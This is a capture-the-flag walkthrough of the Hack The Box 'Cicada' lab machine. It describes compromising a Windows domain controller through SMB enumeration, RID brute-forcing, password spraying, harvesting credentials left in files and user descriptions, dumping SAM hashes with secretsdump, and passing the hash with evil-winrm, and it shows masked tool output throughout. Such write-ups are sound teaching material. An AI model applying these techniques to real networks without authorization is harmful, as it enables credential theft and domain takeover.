# Cicada

URL: https://app.hackthebox.com/machines/Cicada

# Tools

- nmap
- nxc
- smbclient
- evil-winrm
- SecretsDump.py

## Reconnaissance

### Scanning for open ports and services

- The first step in attempting to pwn any machine is to check for any open ports on that victim machine. A cli tool commonly used for this step is NMAP.

    - For more info on NMAP, checkout out: https://nmap.org/book/man.html

- With enough probing, you may discover the OS and a few interesting ports.

    - If you are unfamiliar with the ports discovered, checkout the following resource for explanations on the various ports discovered and what they could be used for: https://www.speedguide.net/ports.php?

    - Another resource to use when gathering intelligence, is to check CVE lists for ports and services identified on your victim machine, to learn about any documented volnurabilities: https://cve.mitre.org/cve/search_cve_list.html

#### NMAP Result

```
Nmap scan report for 10.10.11.35
Host is up (0.078s latency).
Not shown: 65522 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-10-17 21:33:37Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
54824/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: CICADA-DC; OS: Windows; CPE: cpe:/o:microsoft:windows
```

### Scanning directories

- You may have found some open ports that point to the victim machine using the SMB protocol. As a first step, let's try accessing the SMB service anonymously or with a guest account using a cli tool named Netexec.

    - For more info on SMB protocol, check out: https://learn.microsoft.com/en-us/windows/win32/fileio/microsoft-smb-protocol-and-cifs-protocol-overview
    
- You'll notice there are some shares you have read permissions to as a guest user. We should dive deeper into these shares.

#### NXC Result

```
SMB                      10.10.11.35     445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB                      10.10.11.35     445    CICADA-DC        [+] cicada.htb\asdf: 
SMB                      10.10.11.35     445    CICADA-DC        [*] Enumerated shares
SMB                      10.10.11.35     445    CICADA-DC        Share           Permissions     Remark
SMB                      10.10.11.35     445    CICADA-DC        -----           -----------     ------
SMB                      10.10.11.35     445    CICADA-DC        ADMIN$                          Remote Admin
SMB                      10.10.11.35     445    CICADA-DC        C$                              Default share
SMB                      10.10.11.35     445    CICADA-DC        DEV                          
SMB                      10.10.11.35     445    CICADA-DC        HR              READ         
SMB                      10.10.11.35     445    CICADA-DC        IPC$            READ            Remote IPC
SMB                      10.10.11.35     445    CICADA-DC        NETLOGON                        Logon server share
SMB                      10.10.11.35     445    CICADA-DC        SYSVOL                          Logon server share
```

## Establishing a foothold

### Password Spray & Brute Force

- Soon enough you will stumble across an email template from HR to new onboarded employees (if you are having trouble finding this file, I would suggest learning about Netexec spider feature). This email template will contain the default password for new accounts (if you found the file but are now having trouble opening it, I suggest learning about the smbclient cli tool). Let's make note of that default password as it will help us establish a foothold in the system.

    - As an optional step, I recommend storing that password into a default_pass.txt file to make our password spray attack a little easier for us, as many password-cracking tools allow for password files to enumerate through. In our case, our default_pass.txt should contain a single password to try.

    #### HR Email Template

    ```
    Dear new hire!

    Welcome to Cicada Corp! We're thrilled to have you join our team. As part of our security protocols, it's essential that you change your default password to something unique and secure.

    Your default password is: ****************

    To change your password:

    1. Log in to your Cicada Corp account** using the provided username and the default password mentioned above.
    2. Once logged in, navigate to your account settings or profile settings section.
    3. Look for the option to change your password. This will be labeled as "Change Password".
    4. Follow the prompts to create a new password**. Make sure your new password is strong, containing a mix of uppercase letters, lowercase letters, numbers, and special characters.
    5. After changing your password, make sure to save your changes.

    Remember, your password is a crucial aspect of keeping your account secure. Please do not share your password with anyone, and ensure you use a complex password.

    If you encounter any issues or need assistance with changing your password, don't hesitate to reach out to our support team at support@cicada.htb.

    Thank you for your attention to this matter, and once again, welcome to the Cicada Corp team!

    Best regards,
    Cicada Corp
    ```

- Now that we have a default password, we need to gather some usernames to try and brute force. The next step is to scan the SMB service again with our Netexec cli tool, but this time we'll enumerate users by bruteforcing RID. This will produce a list of domain users.

    - As an optional step, I recommend storing the bruteforce rid usernames into a usernames.txt file to make our password spray attack a little easier for us, as many password-cracking tools allow for username files to enumerate through. In our case, our usernames.txt should contain 5 usernames to try (last few entries in code block below).

    #### NXC Result

    ```
    SMB                      10.10.11.35     445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
    SMB                      10.10.11.35     445    CICADA-DC        [+] cicada.htb\asdf: 
    SMB                      10.10.11.35     445    CICADA-DC        498: CICADA\Enterprise Read-only Domain Controllers (SidTypeGroup)
    SMB                      10.10.11.35     445    CICADA-DC        500: CICADA\Administrator (SidTypeUser)
    SMB                      10.10.11.35     445    CICADA-DC        501: CICADA\Guest (SidTypeUser)
    SMB                      10.10.11.35     445    CICADA-DC        502: CICADA\krbtgt (SidTypeUser)
    SMB                      10.10.11.35     445    CICADA-DC        512: CICADA\Domain Admins (SidTypeGroup)
    SMB                      10.10.11.35     445    CICADA-DC        513: CICADA\Domain Users (SidTypeGroup)
    SMB                      10.10.11.35     445    CICADA-DC        514: CICADA\Domain Guests (SidTypeGroup)
    SMB                      10.10.11.35     445    CICADA-DC        515: CICADA\Domain Computers (SidTypeGroup)
    SMB                      10.10.11.35     445    CICADA-DC        516: CICADA\Domain Controllers (SidTypeGroup)
    SMB                      10.10.11.35     445    CICADA-DC        517: CICADA\Cert Publishers (SidTypeAlias)
    SMB                      10.10.11.35     445    CICADA-DC        518: CICADA\Schema Admins (SidTypeGroup)
    SMB                      10.10.11.35     445    CICADA-DC        519: CICADA\Enterprise Admins (SidTypeGroup)
    SMB                      10.10.11.35     445    CICADA-DC        520: CICADA\Group Policy Creator Owners (SidTypeGroup)
    SMB                      10.10.11.35     445    CICADA-DC        521: CICADA\Read-only Domain Controllers (SidTypeGroup)
    SMB                      10.10.11.35     445    CICADA-DC        522: CICADA\Cloneable Domain Controllers (SidTypeGroup)
    SMB                      10.10.11.35     445    CICADA-DC        525: CICADA\Protected Users (SidTypeGroup)
    SMB                      10.10.11.35     445    CICADA-DC        526: CICADA\Key Admins (SidTypeGroup)
    SMB                      10.10.11.35     445    CICADA-DC        527: CICADA\Enterprise Key Admins (SidTypeGroup)
    SMB                      10.10.11.35     445    CICADA-DC        553: CICADA\RAS and IAS Servers (SidTypeAlias)
    SMB                      10.10.11.35     445    CICADA-DC        571: CICADA\Allowed RODC Password Replication Group (SidTypeAlias)
    SMB                      10.10.11.35     445    CICADA-DC        572: CICADA\Denied RODC Password Replication Group (SidTypeAlias)
    SMB                      10.10.11.35     445    CICADA-DC        1000: CICADA\CICADA-DC$ (SidTypeUser)
    SMB                      10.10.11.35     445    CICADA-DC        1101: CICADA\DnsAdmins (SidTypeAlias)
    SMB                      10.10.11.35     445    CICADA-DC        1102: CICADA\DnsUpdateProxy (SidTypeGroup)
    SMB                      10.10.11.35     445    CICADA-DC        1103: CICADA\Groups (SidTypeGroup)
    SMB                      10.10.11.35     445    CICADA-DC        1104: CICADA\j***.s******* (SidTypeUser)           <- HERE
    SMB                      10.10.11.35     445    CICADA-DC        1105: CICADA\s****.d******* (SidTypeUser)          <- HERE
    SMB                      10.10.11.35     445    CICADA-DC        1106: CICADA\m******.w******** (SidTypeUser)       <- HERE
    SMB                      10.10.11.35     445    CICADA-DC        1108: CICADA\d****.o******* (SidTypeUser)          <- HERE
    SMB                      10.10.11.35     445    CICADA-DC        1109: CICADA\Dev Support (SidTypeGroup)
    SMB                      10.10.11.35     445    CICADA-DC        1601: CICADA\e****.o***** (SidTypeUser)            <- HERE
    ```

- Next, we will attempt Netexec's Password Spraying attack. For the username parameter we'll pass the username.txt file, and for the password parameter we'll pass the default_pass.txt file. This is our password spray attack ... and we're in!

    - This step will yield which username matches the default_pass.txt value. To avoid confusion in the next steps, I will refer to this username/password combination as User MW.

    #### NXC Result

    ```
    SMB                      10.10.11.35     445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
    SMB                      10.10.11.35     445    CICADA-DC        [-] CICADA\j***.s*******:******************* STATUS_LOGON_FAILURE
    SMB                      10.10.11.35     445    CICADA-DC        [-] CICADA\s****.d*******:******************* STATUS_LOGON_FAILURE
    SMB                      10.10.11.35     445    CICADA-DC        [+] CICADA\CICADA\m******.w********:*******************
    SMB                      10.10.11.35     445    CICADA-DC        [-] CICADA\d****.o*******:******************* STATUS_LOGON_FAILURE
    SMB                      10.10.11.35     445    CICADA-DC        [-] CICADA\e****.o*****:******************* STATUS_LOGON_FAILURE
    ```

## Privilege escalation

The next few steps may feel repetative, but the point is to escalate our permissions and enumerate resources until we can find our user flag.  

- Next, we will enumerate the domain users on the victim machine once more by continuing to exploit the SMB service, but with the credentials belonging to User MW. The goal is to gather as much intelligence about the users and environment as possible.

- Enumerating the domain users as User MW reveals another interesting user object consisting of a username and password in the description attribute.

    - To avoid confusion in the next steps, I will refer to this username/password combination as User DO.

    #### NXC Result

    ```
    SMB                      10.10.11.35     445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
    SMB                      10.10.11.35     445    CICADA-DC        [+] cicada.htb\m******.w********:*******************
    SMB                      10.10.11.35     445    CICADA-DC        -Username-                    -Last PW Set-       -BadPW- -Description-
    SMB                      10.10.11.35     445    CICADA-DC        Administrator                 2024-08-26 20:08:03 0       Built-in account for administering the computer/domain
    SMB                      10.10.11.35     445    CICADA-DC        Guest                         2024-08-28 17:26:56 0       Built-in account for guest access to the computer/domain
    SMB                      10.10.11.35     445    CICADA-DC        krbtgt                        2024-03-14 11:14:10 0       Key Distribution Center Service Account
    SMB                      10.10.11.35     445    CICADA-DC        j***.s*******                 2024-03-14 12:17:29 0
    SMB                      10.10.11.35     445    CICADA-DC        s****.d*******                2024-03-14 12:17:29 0
    SMB                      10.10.11.35     445    CICADA-DC        m******.w********             2024-03-14 12:17:29 0
    SMB                      10.10.11.35     445    CICADA-DC        d****.o*******                2024-03-14 12:17:29 0       Just in case I forget my password is ************
    SMB                      10.10.11.35     445    CICADA-DC        e****.o*****                  2024-08-22 21:20:17 0
    ```

- Once more we enumerate, but this time let's take a look at what shares User DO has access to.

    #### NXC Result

    ```
    SMB                      10.10.11.35     445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
    SMB                      10.10.11.35     445    CICADA-DC        [+] cicada.htb\d****.o*******:************
    SMB                      10.10.11.35     445    CICADA-DC        [*] Enumerated shares
    SMB                      10.10.11.35     445    CICADA-DC        Share           Permissions     Remark
    SMB                      10.10.11.35     445    CICADA-DC        -----           -----------     ------
    SMB                      10.10.11.35     445    CICADA-DC        ADMIN$                          Remote Admin
    SMB                      10.10.11.35     445    CICADA-DC        C$                              Default share
    SMB                      10.10.11.35     445    CICADA-DC        DEV             READ         
    SMB                      10.10.11.35     445    CICADA-DC        HR              READ         
    SMB                      10.10.11.35     445    CICADA-DC        IPC$            READ            Remote IPC
    SMB                      10.10.11.35     445    CICADA-DC        NETLOGON        READ            Logon server share
    SMB                      10.10.11.35     445    CICADA-DC        SYSVOL          READ            Logon server share
    ```

- As we explore new directories, we find out that User DO has access to the DEV share. Consequently, we find a powershell script, and under closer inspection of the code, we discover another username / password combo.

    - To avoid confusion in the next steps, I will refer to this username/password combination as User EO.

    #### Powershell Script Found

    ```
    $sourceDirectory = "C:\smb"
    $destinationDirectory = "D:\Backup"

    $username = "e****.o*****"
    $password = ConvertTo-SecureString "**************" -AsPlainText -Force
    $credentials = New-Object System.Management.Automation.PSCredential($username, $password)
    $dateStamp = Get-Date -Format "yyyyMMdd_HHmmss"
    $backupFileName = "smb_backup_$dateStamp.zip"
    $backupFilePath = Join-Path -Path $destinationDirectory -ChildPath $backupFileName
    Compress-Archive -Path $sourceDirectory -DestinationPath $backupFilePath
    Write-Host "Backup completed successfully. Backup file saved to: $backupFilePath"
    ```

## Capturing the user flag

- Again we enumerate more shares, but now we'll authenticate as User EO. Interesting... we have read and write permissions to the C$ share now.

    #### NXC Result

    ```
    SMB                      10.10.11.35     445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
    SMB                      10.10.11.35     445    CICADA-DC        [+] cicada.htb\e****.o*****:******************
    SMB                      10.10.11.35     445    CICADA-DC        [*] Enumerated shares
    SMB                      10.10.11.35     445    CICADA-DC        Share           Permissions     Remark
    SMB                      10.10.11.35     445    CICADA-DC        -----           -----------     ------
    SMB                      10.10.11.35     445    CICADA-DC        ADMIN$          READ            Remote Admin
    SMB                      10.10.11.35     445    CICADA-DC        C$              READ,WRITE      Default share
    SMB                      10.10.11.35     445    CICADA-DC        DEV                          
    SMB                      10.10.11.35     445    CICADA-DC        HR              READ         
    SMB                      10.10.11.35     445    CICADA-DC        IPC$            READ            Remote IPC
    SMB                      10.10.11.35     445    CICADA-DC        NETLOGON        READ            Logon server share
    SMB                      10.10.11.35     445    CICADA-DC        SYSVOL          READ            Logon server share
    ```

- The Netexec cli tool allows for enumerating shares with an optional parameter for spidering through shares looking for a pattern of your choosing. Let's look for files that contain the word 'flag'.

    - After a bit of enumerating, we should find a txt file on User EO's desktop with the user flag value to submit to HackTheBox. 
    
- Congratulations! But we still have work to get the root flag value.

- Luckily, on User EO's desktop, we also found some .bak (backup) files that appear to belong to the sam and system hive files. Let's download them to our attack machine using Netexec and prep for extracting the Administrator hash.

## Capturing the root flag

If you've been following along, you should have the sam.bak and system.bak files downloaded to your attack machine.

- Using Impacket's secretsdump.py script, we can target the sam and system hive files to extract a few hashes. We are after the Administrator's NTLM hash in this case.

    #### Secretsdump.py Result

    ```
    Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

    [*] Target system bootKey: 0x3c2b033757a49110a9ee680b46e8d620
    [*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
    Administrator:500:a*********************e:2**************************1:::
    Guest:501:a*********************e:3**************************0:::
    DefaultAccount:503:a*********************e:3**************************0:::
    [-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.
    [*] Cleaning up... 
    ```

- Finally, we use a cli tool named Evil-Winrm to connect to the WINRM service. Evil-Winrm allows us to pass the admin's NTLM hash instead of a password. The root flag can be found on the admin's desktop. 

# Additional resources

- Netexec: https://www.netexec.wiki/smb-protocol/enumeration

- Smbclient: https://commandmasters.com/commands/smbclient-linux/

- SMB Enumeration Cheatsheet: https://0xdf.gitlab.io/cheatsheets/smb-enum#

- How to use the command 'evil-winrm' (with examples): https://commandmasters.com/commands/evil-winrm-common/

- SecretsDump Demystified: https://medium.com/@benichmt1/secretsdump-demystified-bfd0f933dd9b
